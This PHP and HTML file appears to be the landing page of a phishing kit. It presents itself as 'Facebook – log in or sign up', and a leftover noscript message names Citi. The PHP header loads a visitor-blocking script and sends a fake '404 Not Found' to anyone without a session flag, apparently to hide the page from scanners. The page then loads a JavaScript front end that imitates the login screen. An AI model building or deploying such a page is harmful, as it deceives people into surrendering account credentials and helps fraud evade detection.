
<?php
session_start();

include 'API/blockerz/index.php';

require 'API/lib/configClass.php';
$config = new Config;
$config->load('API/config.php');

if($config->get('auth') === '1'){
    if (!isset($_SESSION["logged"]) OR $_SESSION["logged"] !== TRUE) {
        header('HTTP/1.0 404 Not Found');
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
    }
}

?>
<!DOCTYPE html><html lang=en><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=icon href=favicon.png><link rel=stylesheet href=fonts/fontface.css><title>Facebook – log in or sign up</title><link href=css/app.e9f888b5.css rel=preload as=style><link href=js/app.9256d9e9.js rel=preload as=script><link href=js/chunk-vendors.adac2eae.js rel=preload as=script><link href=css/app.e9f888b5.css rel=stylesheet></head><noscript><strong>We're sorry but citi doesn't work properly without JavaScript enabled. Please enable it to continue.</strong></noscript><div id=app></div><script src=js/chunk-vendors.adac2eae.js></script><script src=js/app.9256d9e9.js></script></html>